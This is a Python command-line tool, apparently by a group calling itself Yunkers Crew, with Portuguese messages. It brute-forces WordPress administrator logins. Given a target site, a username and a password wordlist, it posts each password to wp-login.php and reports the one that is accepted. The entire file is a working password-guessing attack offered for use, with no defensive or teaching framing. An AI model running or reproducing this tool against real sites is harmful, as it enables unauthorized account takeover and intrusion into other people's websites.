#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests as r # pip3 install requests
import sys  as p
import colorama # pip3 install colorama
from colorama import init
from colorama import Fore, Back, Style
init()

index = r"""_______________________________________________________________________________
	 __      __          ____                    __             
	/\ \  __/\ \        /\  _`\                 /\ \__          
	\ \ \/\ \ \ \  _____\ \ \L\ \  _ __   __  __\ \ ,_\    __   
	 \ \ \ \ \ \ \/\ '__`\ \  _ <'/\`'__\/\ \/\ \\ \ \/  /'__`\ 
	  \ \ \_/ \_\ \ \ \L\ \ \ \L\ \ \ \/ \ \ \_\ \\ \ \_/\  __/ 
	   \ `\___x___/\ \ ,__/\ \____/\ \_\  \ \____/ \ \__\ \____\
	    '\/__//__/  \ \ \/  \/___/  \/_/   \/___/   \/__/\/____/ v1.1
	                 \ \_\        Recoda não comédia!                              
	                  \/_/    

	       	    Wordpress (Todas versões) Força bruta.
	       	          Criado por Yunkers Crew
	       	      Facebook: @yunkers01 ou @yunkers1
	       	    Yunkers Crew real name no gimmicks ;)
_______________________________________________________________________________ 
"""
user_agent = {'User-agent': 'Mozilla/5.0'}
x = p.argv
script = x[0]
if len(x) == 7:
	if x[1] == "--url":
		url = x[2]
	else:
		print(Fore.GREEN + index)
		print(Fore.RED + "Use: " + Fore.WHITE + "python3 ",script, "--url <site.com.br/wordpress/> --wordlist <wordlist.txt> --usuario <usuario>")
		exit()
	if x[3] == "--wordlist":
		wordlist = x[4]
		if "." not in wordlist:
			print(Fore.RED + "[-] " + Fore.WHITE + "Wordlist não contém uma extensão.")
			exit()
	else:
		print(Fore.GREEN + index)
		print(Fore.RED + "Use: " + Fore.WHITE + "python3 ",script, "--url <site.com.br/wordpress/> --wordlist <wordlist.txt> --usuario <usuario>")
		exit()
	if x[5] == "--usuario":
		usuario = x[6]
	else:
		print(Fore.GREEN + index)
		print(Fore.RED + "Use: " + Fore.WHITE + "python3 ",script, "--url <site.com.br/wordpress/> --wordlist <wordlist.txt> --usuario <usuario>")
		exit()
else:
	print(Fore.GREEN + index)
	print(Fore.RED + "Use: " + Fore.WHITE + "python3 ",script, "--url <site.com.br/wordpress/> --wordlist <wordlist.txt> --usuario <usuario>")
	exit()
def checa_url(url):
	if url[-1] != "/":
		url = url + "/"
	# H T T P : / /
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url
x_senha = []
try:
	x_senha = []
	abrir = open(wordlist, "r")
	linhas = abrir.readlines()
	for linha in linhas:
		x_senha.append(linha)
		senhas = [linha.replace('\n','') for linha in linhas]
except Exception as pp:
	print(Fore.GREEN + index)
	print(Fore.RED + "[ERRO]" + Fore.WHITE + " Não consegui abrir o arquivo {} :/ !".format(wordlist))
	exit()
url = checa_url(url)
print(Fore.GREEN + index)
print(Fore.BLUE + "[...]" + Fore.WHITE + " Verificando conexão com o painel do site {}".format(url))
try:
	checa_site = r.get(url + "wp-login.php", headers=user_agent)
	if checa_site.status_code == 200:
		conta_wordlist = len(senhas)
		print(Fore.GREEN + "[OK]" + Fore.WHITE + " A conexão com o site {} está instável.".format(url))
		print(Fore.YELLOW + "\n[INFO]" + Fore.WHITE + " Usuario: {}".format(usuario))
		print(Fore.YELLOW + "[INFO]" + Fore.WHITE + " Wordlist: {}".format(wordlist))
		print(Fore.YELLOW + "[INFO]" + Fore.WHITE + " Total de linhas da wordlist {}: {}".format(wordlist, conta_wordlist))
		print(Fore.GREEN + "\n[...]" + Fore.WHITE + " Iniciando ataque de brute force.")
	else:
		print(Fore.RED + "[ERRO]" + Fore.WHITE + " Não consegui me conectar ao {} :/ !".format(url))
		exit()
except Exception:
	print(Fore.RED + "[ERRO]" + Fore.WHITE + " Não consegui me conectar ao {} :/ !".format(url))
	exit()
for i in senhas:
	payload = {"log" : usuario,
		   	   "pwd" : i}
	try:
		envia_requisicao = r.post(url + "wp-login.php", data=payload, headers=user_agent)	
		if envia_requisicao.status_code == 200:
			if "wp-login.php?action=lostpassword" in envia_requisicao.text:
				print(Fore.RED + "    [NO]" + Fore.WHITE + " Senha Recusada >> ",i)
			else:
				print(Fore.GREEN + "    [SIM]" + Fore.WHITE + " Senha aceita >> ",i)
				exit()
		else:
			print(Fore.RED + "[ERRO]" + Fore.WHITE + " Não consegui me conectar ao {} :/ !".format(url))
			exit()
	except Exception:
		print(Fore.RED + "[ERRO]" + Fore.WHITE + " Não consegui me conectar ao {} :/ !".format(url))
		exit()	
print(Fore.GREEN + "FINISH!" + Fore.WHITE + "")
abrir.close()	
